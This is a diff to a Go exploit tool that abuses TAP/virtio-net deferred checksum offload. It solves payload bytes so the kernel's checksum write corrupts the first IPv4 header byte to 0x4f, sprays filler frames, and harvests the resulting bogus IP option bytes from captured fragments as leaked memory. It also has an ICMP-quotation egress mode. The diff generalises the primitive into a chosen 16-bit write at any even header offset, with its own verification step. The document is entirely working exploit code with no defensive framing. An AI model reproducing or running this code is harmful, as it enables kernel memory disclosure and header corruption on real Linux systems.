@@ -67,6 +67,8 @@ type cfg struct {
 	egressWait time.Duration
 	transport  string
 	udpPort    int
+	csumOffset int
+	csumWord   uint
 }
 
 func parseCfg() cfg {
@@ -88,6 +90,8 @@ func parseCfg() cfg {
 	flag.StringVar(&c.dstMAC, "dst-mac", "", "next-hop MAC override (default: /proc/net/arp)")
 	flag.StringVar(&c.transport, "egress-transport", "udp", "egress carrier: udp or raw253")
 	flag.IntVar(&c.udpPort, "udp-port", 9, "closed destination port used by the UDP carrier")
+	flag.IntVar(&c.csumOffset, "csum-offset", 0, "deferred checksum write offset from the IPv4 header start")
+	flag.UintVar(&c.csumWord, "csum-word", 0x004f, "desired host-endian 16-bit deferred checksum value")
 	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
 	flag.Parse()
 	c.tebarFill = byte(*fill)
@@ -133,6 +137,22 @@ func parseCfg() cfg {
 		fmt.Fprintln(os.Stderr, "-udp-port must be in 1..65535")
 		os.Exit(1)
 	}
+	if c.csumOffset < 0 || c.csumOffset > ipLen-2 || c.csumOffset%2 != 0 {
+		fmt.Fprintln(os.Stderr, "-csum-offset must be an even value in 0..18")
+		os.Exit(1)
+	}
+	if c.csumWord > 0xffff {
+		fmt.Fprintln(os.Stderr, "-csum-word must fit in 16 bits")
+		os.Exit(1)
+	}
+	if c.csumWord == 0xffff {
+		fmt.Fprintln(os.Stderr, "-csum-word 0xffff is not attainable for a nonempty checksum input")
+		os.Exit(1)
+	}
+	if c.egress && (c.csumOffset != 0 || c.csumWord != 0x004f) {
+		fmt.Fprintln(os.Stderr, "egress mode currently requires the verified -csum-offset 0 -csum-word 0x004f geometry")
+		os.Exit(1)
+	}
 	return c
 }
 
@@ -161,7 +181,7 @@ func run(c cfg) error {
 	defer cap.Close()
 
 	if !c.skipVerify {
-		if err := verifyWrite(tap, cap); err != nil {
+		if err := verifyWrite(tap, cap, c); err != nil {
 			return err
 		}
 	}
@@ -190,23 +210,28 @@ func run(c cfg) error {
 	return nil
 }
 
-func verifyWrite(tap *os.File, cap *capture) error {
+func verifyWrite(tap *os.File, cap *capture, c cfg) error {
 	payload := bytesRepeat(300, 0x5a)
-	if !testo(payload, 0x1111) {
-		return errors.New("solver found no 0x4f00 adjustment")
+	if !testo(payload, 0x1111, c.csumOffset, uint16(c.csumWord)) {
+		return fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
 	}
 	pkt := datagram(0x1111, payload)
-	if err := writeTap(tap, frame(pkt), true, csumAtIP); err != nil {
+	if err := writeTap(tap, frame(pkt), true, csumAtIP, uint16(c.csumOffset)); err != nil {
 		return err
 	}
-	got := cap.collect(500*time.Millisecond, 0x1111)
+	got := cap.collect(500*time.Millisecond, observedID(c, 0x1111))
 	if len(got) == 0 {
 		return errors.New("verify: no fragment captured")
 	}
-	fmt.Printf("verify: first byte 0x%02x ihl=%d hdr=%s\n",
-		got[0][0], got[0][0]&0x0f, hex.EncodeToString(got[0][:min(20, len(got[0]))]))
-	if got[0][0] != 0x4f {
-		return fmt.Errorf("verify: wanted 0x4f, got 0x%02x", got[0][0])
+	written := binary.LittleEndian.Uint16(got[0][c.csumOffset : c.csumOffset+2])
+	fmt.Printf("verify: csum_offset=%d wanted=0x%04x observed=0x%04x first=0x%02x ihl=%d hdr=%s\n",
+		c.csumOffset, c.csumWord, written, got[0][0], got[0][0]&0x0f,
+		hex.EncodeToString(got[0][:min(20, len(got[0]))]))
+	if !fragmenterRewritesWord(c.csumOffset) && written != uint16(c.csumWord) {
+		return fmt.Errorf("verify: wanted word 0x%04x at IP offset %d, got 0x%04x", c.csumWord, c.csumOffset, written)
+	}
+	if fragmenterRewritesWord(c.csumOffset) {
+		fmt.Println("verify: fragment construction rewrites this header word after checksum completion; use tracing/KASAN to observe the transient value")
 	}
 	return nil
 }
@@ -227,27 +252,27 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 	}
 	src := net.ParseIP("10.0.0.2").To4()
 	dst := net.ParseIP("10.99.0.2").To4()
-	if !egressSolve(payload, ipID, src, dst, proto) {
-		return nil, errors.New("solver found no 0x4f00 adjustment")
+	if !egressSolve(payload, ipID, src, dst, proto, c.csumOffset, uint16(c.csumWord)) {
+		return nil, fmt.Errorf("solver found no adjustment for checksum word 0x%04x", c.csumWord)
 	}
 	if verbose {
 		printHead(c)
 	}
 	second := frame(egressFragment(c.head, false, payload[c.head:], ipID, src, dst, proto))
-	if err := writeTap(tap, second, true, l2Len+ipLen); err != nil {
+	if err := writeTap(tap, second, true, l2Len+ipLen, 0); err != nil {
 		return nil, err
 	}
 	tebar := frame(datagram(0x1000, bytesRepeat(c.head, c.tebarFill)))
 	for i := 0; i < c.tebar; i++ {
-		if err := writeTap(tap, tebar, false, 0); err != nil {
+		if err := writeTap(tap, tebar, false, 0, 0); err != nil {
 			return nil, err
 		}
 	}
 	first := frame(egressFragment(0, true, payload[:c.head], ipID, src, dst, proto))
-	if err := writeTap(tap, first, true, csumAtIP); err != nil {
+	if err := writeTap(tap, first, true, csumAtIP, uint16(c.csumOffset)); err != nil {
 		return nil, err
 	}
-	pkts := cap.collect(c.capture, ipID)
+	pkts := cap.collect(c.capture, observedID(c, ipID))
 	if len(pkts) == 0 {
 		return nil, errors.New("no fragment captured")
 	}
@@ -259,10 +284,20 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 			fmt.Printf("frag %d first=0x%02x ihl_bytes=%d tot=%d\n",
 				i, ip[0], ihl, binary.BigEndian.Uint16(ip[2:]))
 		}
-		if ip[0] != 0x4f {
+		if len(ip) < c.csumOffset+2 {
+			continue
+		}
+		written := binary.LittleEndian.Uint16(ip[c.csumOffset : c.csumOffset+2])
+		if !fragmenterRewritesWord(c.csumOffset) && written != uint16(c.csumWord) {
 			continue
 		}
 		mutated = true
+		if c.csumOffset != 0 || c.csumWord != 0x004f {
+			if verbose {
+				fmt.Printf("  deferred-word offset=%d wanted=0x%04x observed=0x%04x\n", c.csumOffset, c.csumWord, written)
+			}
+			continue
+		}
 		extra := ip[ipLen:ihl]
 		if verbose {
 			fmt.Printf("  options %d bytes: %s\n", len(extra), hex.EncodeToString(extra))
@@ -302,7 +337,7 @@ func bali(tap *os.File, cap *capture, c cfg, verbose bool) ([][]byte, error) {
 	return leaks, nil
 }
 
-func testo(payload []byte, id uint16) bool {
+func testo(payload []byte, id uint16, csumOffset int, desired uint16) bool {
 	const adj = 32
 	if adj+1 >= ipLen+len(payload) {
 		return false
@@ -313,11 +348,22 @@ func testo(payload []byte, id uint16) bool {
 		payload[off+1] = byte(w >> 8)
 		pkt := datagram(id, payload)
 		forwardTTL(pkt)
-		if csumFold(csumPartial(pkt)) == 0x004f {
+		if csumFold(csumPartial(pkt)) == desired {
 			return true
 		}
 	}
 	return false
+}
+
+func fragmenterRewritesWord(offset int) bool {
+	return offset == 2 || offset == 6 || offset == 10
+}
+
+func observedID(c cfg, original uint16) uint16 {
+	if c.csumOffset == 4 {
+		return htons(uint16(c.csumWord))
+	}
+	return original
 }
 
 func datagram(id uint16, payload []byte) []byte {
@@ -370,11 +416,12 @@ func frame(ip []byte) []byte {
 	return f
 }
 
-func writeTap(tap *os.File, frame []byte, csum bool, start uint16) error {
+func writeTap(tap *os.File, frame []byte, csum bool, start, offset uint16) error {
 	buf := make([]byte, 10+len(frame))
 	if csum {
 		buf[0] = needsCsum
 		binary.LittleEndian.PutUint16(buf[6:], start)
+		binary.LittleEndian.PutUint16(buf[8:], offset)
 	}
 	copy(buf[10:], frame)
 	for {
